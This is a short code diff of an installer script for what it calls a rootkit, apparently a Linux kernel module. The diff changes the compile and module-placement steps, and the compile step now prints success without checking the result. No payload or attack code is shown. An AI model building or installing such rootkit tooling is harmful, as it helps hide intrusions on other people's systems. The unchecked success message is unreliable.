@@ -170,11 +170,8 @@ def install(kernel_version):
 
 	# TODO: Compile rootkit
 	print_status("Compiling rootkit...")
-	if not run_cmd("make all"):
-		print_error("Compiling failed.")
-		sys.exit(1)
-	else:
-		print_success("Successful compilation.")
+	run_cmd("cd rootkit && make all")
+	print_success("Successful compilation.")
 
 	# TODO: Move compiled components to the right place. Maybe drop it in "/lib/modules/{0}/garden?
 	print_status("Installing rootkit...")
@@ -186,7 +183,7 @@ def install(kernel_version):
 
 	try:
 		# TODO: Decide if moving the .ko file to the module_dir is necessary
-		move(config["MODULE_NAME"] + ".ko", module_dest_path)
+		move("rootkit/{}.ko".format(config["MODULE_NAME"]), module_dest_path)
 	except IOError as e:
 		print_error("Unable to copy file. {}".format(e))
 		sys.exit()
